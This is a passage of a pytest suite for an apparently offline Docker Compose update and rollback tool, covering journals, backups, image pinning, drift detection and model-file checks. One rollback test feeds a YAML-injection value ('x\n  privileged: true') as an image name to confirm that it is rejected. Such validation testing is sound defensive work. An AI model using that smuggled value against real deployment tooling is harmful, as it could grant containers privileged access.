    assert second["rollback_tag"] != first["rollback_tag"]
    assert second["baseline"]["counts"]["source"] == 150
    assert [s["step"] for s in second["steps"]].count("I_backup") == 1
    archived = list((tmp_path / "state" / "journals").glob("journal-*.json"))
    assert len(archived) == 1
    assert json.loads(archived[0].read_text())["attempt_id"] == first["attempt_id"]
    assert (
        sum(1 for c in fake_docker.calls() if c[0] == "load") == 2
    )  # each attempt loads and identifies the image itself


def test_completed_update_then_next_version(deployment, fake_docker, repo, tmp_path):
    """completed -> a later package: its baseline is the image of the FIRST update,
    it takes its own backup, and its rollback returns to that image, not to v1.2.0."""
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert _finish(conf) == 0
    assert _rollback(conf, "legal-on") == 0  # the operator's gate decision
    assert _backups(marker) == 1

    (repo / "VERSION").write_text("1.3.1\n")
    _git(repo, "commit", "-qam", "1.3.1")
    fake_docker.edit(lambda s: s["inventory"].update(app_version="1.3.1"))
    pkg2, digest2 = _build(
        repo, tmp_path, "--supported-from", "1.3.0", version="1.3.1", out="dist2"
    )
    pkg_dir2 = _unpack_on_server(fake_docker, pkg2, digest2, tmp_path / "pkgx2")
    assert _server("update", conf, pkg_dir2, "--apply") == 0
    journal = _journal(tmp_path)
    assert _backups(marker) == 2
    assert journal["baseline"]["image_id"] == IMAGE_ID
    assert journal["expected_image_id"] == NEXT_ID
    assert fake_docker.app()["image_id"] == NEXT_ID
    # the Legal gate the operator switched on survives the next update
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"
    assert _rollback(conf) == 0
    assert fake_docker.app()["image_id"] == IMAGE_ID
    # the rollback keeps the gate of the image it returns to, and so does the
    # attempt after it (read from the running container, not from the journal)
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"
    assert _server("update", conf, pkg_dir2, "--apply") == 0
    assert _backups(marker) == 3
    assert fake_docker.app()["image_id"] == NEXT_ID
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"


def test_failed_attempt_then_retry_takes_a_new_backup(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    fake_docker.set(fail_on_image={IMAGE_ID: ["readiness --check"]})
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    first = _journal(tmp_path)["attempt_id"]
    # failed and still on the new image: a new update is refused until it is rolled back
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_PREFLIGHT
    assert (
        _server("update", conf, pkg_dir, "--apply", "--allow-version-mismatch")
        == OP.EXIT_UPDATE
    )
    assert _backups(marker) == 1
    assert _rollback(conf, "interrupted") == 0
    fake_docker.set(fail_on_image={})
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert _backups(marker) == 2 and _journal(tmp_path)["attempt_id"] != first


def test_resume_reuses_the_backup_only_while_it_is_fresh(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    fake_docker.edit(
        lambda s: s["rapidocr"].update(
            copied={"det.onnx": "skipped (checksum mismatch)"}, on_volume=[]
        )
    )
    assert (
        _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    )  # stops before the recreate
    assert _backups(marker) == 1 and not _ups(fake_docker)
    attempt = _journal(tmp_path)["attempt_id"]
    # same attempt, minutes later: the verified backup of THIS attempt is still valid
    assert _server("update", conf, pkg_dir, "--apply", "--accept-missing-rapidocr") == 0
    assert _backups(marker) == 1 and _journal(tmp_path)["attempt_id"] == attempt


def test_resume_takes_a_new_backup_when_the_old_one_is_too_old(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    fake_docker.edit(lambda s: s["rapidocr"].update(copied={}, on_volume=[]))
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    _set_conf(conf, BACKUP_MAX_AGE_MINUTES="0")
    assert _server("update", conf, pkg_dir, "--apply", "--accept-missing-rapidocr") == 0
    assert _backups(marker) == 2


def test_closing_an_attempt_that_recreated_nothing_does_not_restart_the_application(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path, verify="exit 4")
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE  # stops at J
    container = fake_docker.app()["id"]
    assert _rollback(conf, "interrupted") == 0
    assert (
        not _ups(fake_docker) and fake_docker.app()["id"] == container
    )  # not restarted
    journal = _journal(tmp_path)
    assert journal["status"] == "rolled_back"
    assert journal["steps"][-1]["step"] == "ROLLBACK_nothing_recreated"
    _set_conf(conf, BACKUP_VERIFY_CMD="true")
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert (
        _backups(marker) == 2
        and _journal(tmp_path)["attempt_id"] != journal["attempt_id"]
    )


def test_state_directory_and_journal_are_private(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    assert (state.stat().st_mode & 0o077) == 0
    for name in ("journal.json", "journal.json.bak", "image-override.yml"):
        assert ((state / name).stat().st_mode & 0o077) == 0, name
    assert all((p.stat().st_mode & 0o077) == 0 for p in state.glob("artifacts-*.json"))


def test_incomplete_backup_stops_the_update(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    _set_conf(conf, BACKUP_CMD="exit 3", BACKUP_VERIFY_CMD="true")
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    assert not _ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    marker = _with_backup_cmd(conf, tmp_path, verify="exit 4")  # restore check fails
    assert _server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    assert not _ups(fake_docker) and _backups(marker) == 1
    assert "J_backup_verified" not in [s["step"] for s in _journal(tmp_path)["steps"]]


def test_undecided_update_blocks_a_new_one(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0  # awaiting approval
    loads = sum(1 for c in fake_docker.calls() if c[0] == "load")
    assert _apply(conf, pkg_dir, "--allow-version-mismatch") == OP.EXIT_PREFLIGHT
    assert sum(1 for c in fake_docker.calls() if c[0] == "load") == loads
    assert _journal(tmp_path)["status"] == "awaiting_approval"


def test_another_package_cannot_take_over_an_unfinished_attempt(
    deployment, fake_docker, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    rc = _server("update", conf, pkg_dir, "--apply", "--backup-reference", "x")
    assert rc == OP.EXIT_UPDATE  # in progress (restore not verified)
    (repo / "README.md").write_text("changed\n")
    _git(repo, "commit", "-qam", "another build")
    fake_docker.edit(
        lambda s: (
            s["images"].update({TARGET: IMAGE_ID}),
            s["image_configs"].update({IMAGE_ID: NEW_CONFIG}),
        )
    )
    pkg2, digest2 = _build(repo, tmp_path, out="dist2")
    pkg_dir2 = _unpack_on_server(fake_docker, pkg2, digest2, tmp_path / "pkgx2")
    assert _apply(conf, pkg_dir2) == OP.EXIT_PREFLIGHT
    assert _journal(tmp_path)["manifest_sha256"] == OP.sha256_file(
        pkg_dir / "manifest.json"
    )


def test_journal_of_the_previous_tool_version(deployment, fake_docker, tmp_path):
    """An old journal (no attempt id, no baseline) is archived, never trusted."""
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    state = tmp_path / "state"
    state.mkdir()
    old = {
        "version": "1.3.0-rc.1", "status": "rolled_back", "previous_image": OTHER_ID,
        "rollback_tag": "chatbot5400:rollback-old",
        "steps": [{"step": "G_load"}, {"step": "I_backup", "at": "2026-11-01T10:00:00"},
                  {"step": "J_backup_verified", "at": "2026-11-01T10:05:00"}],
    }  # fmt: skip
    (state / "journal.json").write_text(json.dumps(old))
    assert _server("update", conf, pkg_dir, "--apply") == 0
    assert _backups(marker) == 1  # the old journal's backup was NOT reused
    journal = _journal(tmp_path)
    assert (
        journal["baseline"]["image_id"] == OLD_ID
        and journal["rollback_tag"] != "chatbot5400:rollback-old"
    )
    assert len(list((state / "journals").glob("*.json"))) == 1


def test_old_journal_awaiting_approval_is_not_finished_blindly(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    state = tmp_path / "state"
    state.mkdir()
    (state / "journal.json").write_text(
        json.dumps(
            {"version": "1.3.0-rc.1", "status": "awaiting_approval", "steps": []}
        )
    )
    assert _finish(conf) == OP.EXIT_UPDATE  # no image id recorded: cannot be confirmed
    assert _apply(conf, pkg_dir) == OP.EXIT_PREFLIGHT
    assert _rollback(conf) == OP.EXIT_UPDATE  # no baseline: an explicit image is needed
    assert _rollback(conf, "app", "--to-image", "chatbot5400:local") == 0
    assert _journal(tmp_path)["status"] == "rolled_back"


# --- F-24: rollback by verified image ID -------------------------------------


def test_rollback_uses_the_image_id_when_the_tag_was_moved(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    tag = _journal(tmp_path)["rollback_tag"]

    def move(s):  # somebody re-tagged it (or pruned and re-created the name)
        s["images"][tag] = OTHER_ID
        s["image_configs"][OTHER_ID] = OTHER_CONFIG

    fake_docker.edit(move)
    assert _rollback(conf) == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    journal = _journal(tmp_path)
    assert journal["rollback_tag"] != tag and journal["status"] == "rolled_back"
    assert fake_docker.get()["images"][journal["rollback_tag"]] == OLD_ID


def test_rollback_refuses_when_the_baseline_image_is_gone(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0

    def prune(s):
        s["image_configs"].pop(OLD_ID)
        s["images"] = {k: v for k, v in s["images"].items() if v != OLD_ID}

    fake_docker.edit(prune)
    ups = len(_ups(fake_docker))
    assert _rollback(conf) == OP.EXIT_UPDATE
    assert len(_ups(fake_docker)) == ups and fake_docker.app()["image_id"] == IMAGE_ID
    assert _journal(tmp_path)["status"] == "awaiting_approval"  # nothing was changed


def test_rollback_to_image_is_validated(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    assert (
        _rollback(conf, "app", "--to-image", "x\n  privileged: true") == OP.EXIT_USAGE
    )
    assert _rollback(conf, "app", "--to-image", "chatbot5400:missing") == OP.EXIT_UPDATE
    fake_docker.edit(
        lambda s: (
            s["images"].update({"chatbot5400:other": OTHER_ID}),
            s["image_configs"].update({OTHER_ID: OTHER_CONFIG}),
        )
    )
    assert (
        _rollback(conf, "app", "--to-image", "chatbot5400:other") == OP.EXIT_UPDATE
    )  # not the baseline
    assert fake_docker.app()["image_id"] == IMAGE_ID
    assert _rollback(conf, "app", "--to-image", "chatbot5400:local") == 0
    assert fake_docker.app()["image_id"] == OLD_ID


def test_rollback_reports_failure_when_the_old_image_is_unhealthy(
    deployment, fake_docker, tmp_path
):
    """F-09: a rollback that does not pass its checks is not called a success."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    fake_docker.set(fail_on_image={OLD_ID: ["import docling"]})
    assert _rollback(conf) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "rollback_failed"
    assert _apply(conf, pkg_dir, "--allow-version-mismatch") == OP.EXIT_PREFLIGHT
    fake_docker.set(fail_on_image={})
    assert _rollback(conf) == 0  # an interrupted / failed rollback can be repeated
    assert _journal(tmp_path)["status"] == "rolled_back"


def test_rollback_refused_for_a_migration_package(
    deployment, fake_docker, tmp_path, monkeypatch
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    real = OP.load_package

    def migrated(*a, **k):
        m = real(*a, **k)
        m["database"]["migration_required"] = True
        return m

    monkeypatch.setattr(OP, "load_package", migrated)
    assert _rollback(conf, "app", "--package-dir", str(pkg_dir)) == OP.EXIT_UPDATE
    assert fake_docker.app()["image_id"] == IMAGE_ID


# --- F-09: finish is health-checked -------------------------------------------


def test_finish_failure_is_not_completed_and_can_be_retried(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    health = [x for x in conf.read_text().splitlines() if x.startswith("HEALTH_URL=")][
        0
    ]
    _set_conf(conf, HEALTH_URL="http://127.0.0.1:9/health")
    assert _finish(conf) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "finish_failed"
    assert (
        _status(conf) == 0
    )  # the right image runs; the state itself says it is not finished
    _set_conf(conf, HEALTH_URL=health.split("=", 1)[1])
    assert _finish(conf) == 0
    assert _journal(tmp_path)["status"] == "completed"


def test_finish_refuses_a_changed_override(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    override = tmp_path / "state" / "image-override.yml"
    override.write_text(override.read_text().replace(TARGET, "chatbot5400:local"))
    ups = len(_ups(fake_docker))
    assert _finish(conf) == OP.EXIT_UPDATE
    assert len(_ups(fake_docker)) == ups


# --- F-13: the journal ---------------------------------------------------------


def test_journal_is_written_atomically_with_a_backup_copy(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    assert (
        json.loads((state / "journal.json.bak").read_text())["attempt_id"]
        == _journal(tmp_path)["attempt_id"]
    )
    assert not list(state.glob("*.tmp"))


@pytest.mark.parametrize(
    "damage", ['{"version": "1.3.0-rc.1", "status": "in_pro', "", "[]", "\x00\x00"]
)
def test_damaged_journal_stops_everything_without_a_blind_reset(
    deployment, fake_docker, tmp_path, capsys, damage
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    (state / "journal.json").write_text(damage)  # power loss in the middle of a write
    calls = len(fake_docker.calls())
    capsys.readouterr()
    for run in (
        lambda: _status(conf),
        lambda: _apply(conf, pkg_dir, "--allow-version-mismatch"),
        lambda: _finish(conf),
        lambda: _rollback(conf),
        lambda: OP.main(["pin", "--config", str(conf)]),
    ):
        assert run() == OP.EXIT_UPDATE
    out = capsys.readouterr().out
    assert "damaged" in out and "journal.json.bak" in out and "awaiting_approval" in out
    assert (state / "journal.json").read_text() == damage  # not replaced, not deleted
    assert not _ups(fake_docker, calls)  # nothing was recreated on a guess
    # the documented recovery: the previous good copy
    shutil.copy2(state / "journal.json.bak", state / "journal.json")
    assert _status(conf) == 0 and _finish(conf) == 0


def test_damaged_journal_without_a_backup_copy(deployment, tmp_path, capsys):
    conf, _, _ = deployment
    state = tmp_path / "state"
    state.mkdir()
    (state / "journal.json").write_text("{")
    assert _status(conf) == OP.EXIT_UPDATE
    assert "no readable backup copy" in capsys.readouterr().out


# --- F-21: the database container is proven untouched --------------------------


def test_database_container_recreated_by_compose_is_detected(
    deployment, fake_docker, tmp_path, capsys
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(up_recreates_db=True)  # e.g. a Compose that ignores --no-deps
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert "DATABASE CONTAINER CHANGED" in capsys.readouterr().out
    journal = _journal(tmp_path)
    assert journal["status"] != "awaiting_approval" and journal["db_changed"] is True
    assert _finish(conf) == OP.EXIT_UPDATE
    # the rollback still restores the application but keeps reporting the database
    fake_docker.set(up_recreates_db=False)
    assert _rollback(conf, "interrupted") == OP.EXIT_UPDATE
    assert fake_docker.app()["image_id"] == OLD_ID
    assert _journal(tmp_path)["status"] == "rollback_failed"
    assert _rollback(conf, "interrupted", "--acknowledge-db-change") == 0
    assert _journal(tmp_path)["status"] == "rolled_back"


def test_database_restarted_before_the_recreate_is_detected(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    rc = _server("update", conf, pkg_dir, "--apply", "--backup-reference", "x")
    assert rc == OP.EXIT_UPDATE  # attempt started, baseline taken
    fake_docker.edit(
        lambda s: s["containers"]["db1"].update(started_at="2026-11-17T23:00:00Z")
    )
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _ups(fake_docker)


@pytest.mark.parametrize(
    "after_up",
    [
        {"schema": 34},
        {
            "counts": {
                "source": 0,
                "notebook": 7,
                "note": 31,
                "source_embedding": 5400,
                "source_insight": 12,
            }
        },
    ],
)
def test_schema_or_row_counts_changing_after_the_recreate_fail_the_update(
    deployment, fake_docker, tmp_path, after_up
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(on_up=after_up)
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"
    assert (
        fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    )  # stays in maintenance


def test_acceptance_uploads_and_a_reboot_before_finish_are_not_reported_as_damage(
    deployment, fake_docker, tmp_path
):
    """The checks compare with the state right before EACH recreate, not with the
    start of the attempt: during acceptance (maintenance mode) the operator uploads
    test documents, and the server may be rebooted before `finish` or `rollback`."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    fake_docker.edit(
        lambda s: s["counts"].update(source=121, source_embedding=5460)
    )  # acceptance PDF
    fake_docker.edit(
        lambda s: s["containers"]["db1"].update(started_at="2026-11-19T06:00:00Z")
    )  # reboot
    assert _finish(conf) == 0
    journal = _journal(tmp_path)
    assert journal["status"] == "completed"
    assert journal["reference"]["counts"]["source"] == 121
    assert (
        journal["baseline"]["counts"]["source"] == 120
    )  # the attempt's own record is kept
    # weeks later: more data, another reboot, then a rollback
    fake_docker.edit(lambda s: s["counts"].update(source=300, note=90))
    fake_docker.edit(
        lambda s: s["containers"]["db1"].update(started_at="2026-12-01T06:00:00Z")
    )
    assert _rollback(conf) == 0
    assert _journal(tmp_path)["status"] == "rolled_back"
    assert fake_docker.app()["image_id"] == OLD_ID


def test_finish_fails_when_a_table_with_data_is_empty_afterwards(
    deployment, fake_docker, tmp_path
):
    """Normal mode: counts may move (users are back), but a table that had rows
    and is empty after the recreate means the application sees another database."""
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    emptied = dict(fake_docker.get()["counts"], source=0, source_embedding=0)
    fake_docker.set(on_up={"counts": emptied})
    assert _finish(conf) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "finish_failed"


def test_counts_verdict():
    before = {"source": 120, "note": 0}
    assert OP.counts_verdict(before, {"source": 120, "note": 0}, True)[0]
    assert not OP.counts_verdict(before, {"source": 121, "note": 0}, True)[
        0
    ]  # maintenance: exact
    assert OP.counts_verdict(before, {"source": 125, "note": 3}, False)[
        0
    ]  # normal: users work
    assert OP.counts_verdict(before, {"source": 110, "note": 0}, False)[
        0
    ]  # a user deleted some
    assert not OP.counts_verdict(before, {"source": 0, "note": 0}, False)[0]
    assert not OP.counts_verdict(before, {"note": 0}, False)[0]
    assert not OP.counts_verdict(before, None, False)[0]
    assert not OP.counts_verdict(before, None, True)[0]


# --- F-22: offline artifacts -----------------------------------------------------


@pytest.mark.parametrize(
    "result",
    [
        {
            "copied": {
                "det.onnx": "imported",
                "rec.onnx": "skipped (checksum mismatch)",
            },
            "on_volume": [["det.onnx", 1]],
        },
        {"copied": {}, "on_volume": []},
        "garbage",
    ],
)
def test_rapidocr_weights_must_be_on_the_volume_before_the_recreate(
    deployment, fake_docker, tmp_path, result
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(rapidocr=result)
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    step = [s for s in _journal(tmp_path)["steps"] if s["step"] == "RAPIDOCR_weights"][
        -1
    ]
    assert step["ok"] is False
    assert (
        _apply(conf, pkg_dir, "--accept-missing-rapidocr") == 0
    )  # the operator's explicit decision


def test_rapidocr_copy_command_failing_is_not_ignored(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail=["import_rapidocr_weights"])
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _ups(fake_docker)


LOST_AGRI = lambda s: s["artifacts"]["ocr_models"].pop(4)  # noqa: E731
LOST_HERON = lambda s: s["artifacts"]["huggingface_hub"].pop(0)  # noqa: E731
DANGLING_TABLEFORMER = lambda s: s["artifacts"]["huggingface_hub"][1].__setitem__(1, -1)  # noqa: E731


@pytest.mark.parametrize(
    "loss",
    [LOST_AGRI, LOST_HERON, DANGLING_TABLEFORMER],
    ids=["agri", "heron", "tableformer-blob"],
)
def test_model_files_missing_in_the_new_container_fail_the_update(
    deployment, fake_docker, tmp_path, capsys, loss
):
    """F-22: every model file the old container saw on the data volume (Layout
    Heron, TableFormer, Tesseract incl. OSD and Agri, RapidOCR, EasyOCR) must be
    there, same size, in the new container - whatever the readiness state says."""
    conf, pkg_dir, _ = deployment
    after = fake_docker.get()
    loss(after)
    fake_docker.set(on_up={"artifacts": after["artifacts"]})
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"
    assert "model files on the data volume unchanged" in capsys.readouterr().out
    step = [
        s for s in _journal(tmp_path)["steps"] if s["step"] == "ARTIFACTS_snapshot"
    ][0]
    assert step["files"] == {"huggingface_hub": 2, "ocr_models": 7}


def test_model_files_that_cannot_be_listed_stop_the_update_before_the_recreate(
    deployment, fake_docker
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail=["ARTIFACTS"])
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert not _ups(fake_docker)


def test_new_model_files_are_not_a_loss():
    before = {"ocr_models": [["a", 1]], "huggingface_hub": []}
    assert (
        OP.artifact_losses(
            before, {"ocr_models": [["a", 1], ["b", 2]], "huggingface_hub": []}
        )
        == []
    )
    assert OP.artifact_losses(before, {"ocr_models": [["a", 2]]}) == [
        "ocr_models/a (size 1 -> 2)"
    ]
    assert OP.artifact_losses(before, {}) == ["ocr_models/a (missing)"]
    assert OP.artifact_losses(before, None)


def test_token_counting_must_work_offline_in_the_new_container(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail_on_image={IMAGE_ID: ["chunk_text"]})
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"


def test_token_encoding_constants_match_the_application():
    from open_notebook.utils import token_utils

    assert OP.TIKTOKEN_ENCODING == token_utils.TIKTOKEN_ENCODING
    assert OP.TIKTOKEN_BLOB_URL == token_utils.TIKTOKEN_BLOB_URL
    assert OP.TIKTOKEN_BLOB_SHA256 == token_utils.TIKTOKEN_BLOB_SHA256
    assert (
        Path(token_utils.tiktoken_cache_file()).name
        == hashlib.sha1(OP.TIKTOKEN_BLOB_URL.encode()).hexdigest()
    )


@pytest.mark.parametrize(
    "loads, right_file, ready",
    [(True, True, True), (False, True, False), (True, False, False)],
    ids=["usable", "does-not-load", "wrong-cache-file"],
)
def test_inventory_reports_the_token_encoding_cache(
    tmp_path, monkeypatch, capsys, loads, right_file, ready
):
    """The inventory (run with --network none inside the image) records the
    encoding, the cache path, every cache file with its SHA-256, whether the
    expected file is there byte for byte, and whether the encoding loads with
    no network. tiktoken itself is replaced here: the real one would download."""
    import types

    app_root = tmp_path / "app"
    (app_root / "open_notebook" / "database" / "migrations").mkdir(parents=True)
    (
        app_root / "open_notebook" / "database" / "migrations" / "33.surrealql"
    ).write_text("")
    (app_root / "VERSION").write_text("1.2.0\n")
    cache = tmp_path / "tiktoken-cache"
    cache.mkdir()
    name = hashlib.sha1(OP.TIKTOKEN_BLOB_URL.encode()).hexdigest()
    (cache / name).write_bytes(b"encoding bytes")
    monkeypatch.setenv("TIKTOKEN_CACHE_DIR", str(cache))
    digest = hashlib.sha256(b"encoding bytes").hexdigest()
    monkeypatch.setattr(OP, "TIKTOKEN_BLOB_SHA256", digest if right_file else "0" * 64)

    class Encoding:
        def encode(self, text):
            return text.split()

    def get_encoding(encoding):
        assert encoding == "o200k_base"
        if not loads:
            raise OSError("network unreachable")
        return Encoding()

    monkeypatch.setitem(
        sys.modules, "tiktoken", types.SimpleNamespace(get_encoding=get_encoding)
    )
    assert OP.main(["inventory", "--app-root", str(app_root)]) == 0
    info = json.loads(capsys.readouterr().out)
    tik = info["runtime_artifacts"]["tiktoken"]
    assert tik["encoding"] == "o200k_base" and tik["cache_dir"] == str(cache)
    assert tik["files"] == [{"name": name, "size": 14, "sha256": digest}]
    assert tik["expected_file"] == name
    assert tik["loads_offline"] is loads and tik["checksum_ok"] is right_file
    assert info["runtimes_baked"]["tiktoken_offline"] is ready
    assert info["schema_version"] == 33 and info["app_version"] == "1.2.0"


# --- F-20: another image store ---------------------------------------------------


def test_image_loaded_into_another_image_store_is_recognised_by_its_layers(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    fake_docker.set(store="containerd")  # image ID != the ID seen on the build machine
    assert _apply(conf, pkg_dir) == 0
    journal = _journal(tmp_path)
    server_id = fake_docker.get()["images"][TARGET]
    assert server_id != IMAGE_ID and journal["expected_image_id"] == server_id
    assert "layer" in journal["steps"][0]["identified_by"]
    assert fake_docker.app()["image_id"] == server_id
    assert _finish(conf) == 0 and _status(conf) == 0


def test_loaded_image_that_is_not_the_packaged_one_is_refused(
    deployment, fake_docker, tmp_path, monkeypatch
):
    conf, pkg_dir, _ = deployment
    monkeypatch.setattr(
        OP,
        "inspect_image",
        lambda ref: (OTHER_ID, ["sha256:" + "1" * 64]) if ref == TARGET else None,
    )
    assert (
        _apply(conf, pkg_dir) == OP.EXIT_PREFLIGHT
    )  # the tag is taken by another image
    assert not _ups(fake_docker)


# --- F-11: drift and the persistent pin ------------------------------------------


@pytest.fixture
def completed(deployment, fake_docker):
    conf, pkg_dir, deploy = deployment
    assert _apply(conf, pkg_dir) == 0
    assert _finish(conf) == 0
    return conf, pkg_dir, deploy


def test_plain_compose_up_is_detected_as_drift(completed, fake_docker, capsys):
    """The exact failure of F-11: somebody runs `docker compose up -d` in the
    deployment folder and the OLD image comes back. status and health say so."""
    conf, _, deploy = completed
    assert _status(conf) == 0
    _plain_compose_up(deploy)
    assert fake_docker.app()["image_id"] == OLD_ID
    capsys.readouterr()
    assert _status(conf) == OP.EXIT_DRIFT
    out = capsys.readouterr().out
    assert "IMAGE DRIFT" in out and "ENVIRONMENT DRIFT" in out
    assert OP.main(["health", "--config", str(conf)]) == OP.EXIT_DRIFT
    # the recorded command brings the approved image back
    command = (
        Path(OP.load_config(str(conf))["STATE_DIR"]) / "compose-command.txt"
    ).read_text()
    subprocess.run(["bash", "-c", command], check=True)
    assert fake_docker.app()["image_id"] == IMAGE_ID and _status(conf) == 0


def test_pin_is_a_dry_run_unless_applied(completed, fake_docker, capsys):
    conf, _, deploy = completed
    before = fake_docker.get()["images"]
    assert OP.main(["pin", "--config", str(conf)]) == 0
    out = capsys.readouterr().out
    assert (
        "DRY RUN" in out
        and "COMPOSE_FILE=docker-compose.yml:docker-compose.offline-pin.yml" in out
    )
    assert fake_docker.get()["images"] == before
    assert not (deploy / OP.PIN_FILE).exists()


def test_pin_needs_a_completed_update(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == OP.EXIT_UPDATE
    assert _apply(conf, pkg_dir) == 0  # awaiting approval
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == OP.EXIT_UPDATE


def test_pinned_image_survives_a_plain_compose_up(
    completed, fake_docker, tmp_path, capsys
):
    conf, _, deploy = completed
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert fake_docker.get()["images"]["chatbot5400:local"] == IMAGE_ID
    pin_file = deploy / OP.PIN_FILE
    assert 'image: "chatbot5400:local"' in pin_file.read_text()
    assert 'OCR_OFFLINE: "true"' in pin_file.read_text()
    assert (
        deploy / ".env"
    ).read_text() == "SURREAL_PASSWORD=do-not-read\n"  # never edited
    assert (deploy / "docker-compose.yml").read_text() == "services: {}\n"
    assert _journal(tmp_path)["pin"]["applied"] is True

    # restart / recreate / reboot script: the plain command no longer goes back
    _plain_compose_up(deploy)
    assert fake_docker.app()["image_id"] == IMAGE_ID
    capsys.readouterr()
    assert (
        _status(conf) == OP.EXIT_DRIFT
    )  # ...but without the pin file the offline variables are gone
    out = capsys.readouterr().out
    assert "ENVIRONMENT DRIFT" in out and "IMAGE DRIFT" not in out
    # with the line the tool printed for COMPOSE_FILE there is no drift at all
    _plain_compose_up(deploy, "docker-compose.yml", OP.PIN_FILE)
    assert fake_docker.app()["image_id"] == IMAGE_ID and _status(conf) == 0
    # the previous image is still reachable for a rollback
    assert fake_docker.get()["images"][_journal(tmp_path)["rollback_tag"]] == OLD_ID


def test_pin_refuses_an_image_name_the_deployment_does_not_use(
    completed, fake_docker, tmp_path
):
    """The name is only retargeted when the replaced container was created from it."""
    conf, _, deploy = completed
    state = tmp_path / "state" / "journal.json"
    journal = json.loads(state.read_text())
    for used in ("some-other-name:1", OLD_ID, ""):
        journal["baseline"]["image_ref"] = used
        state.write_text(json.dumps(journal))
        assert OP.main(["pin", "--config", str(conf), "--apply"]) == OP.EXIT_UPDATE
        assert fake_docker.get()["images"]["chatbot5400:local"] == OLD_ID
        assert not (deploy / OP.PIN_FILE).exists()


def test_pin_with_a_build_only_service_uses_the_compose_image_name(
    completed, fake_docker, tmp_path
):
    """Production compose has `build:` and no `image:`: Compose v2 names the image
    <project>-<service>. MOCK ONLY - real Compose behaviour is a local gate."""
    conf, _, deploy = completed

    def build_only(s):
        s["config"]["services"]["open_notebook"].pop("image")
        s["images"]["cb-test-open_notebook:latest"] = OLD_ID

    fake_docker.edit(build_only)
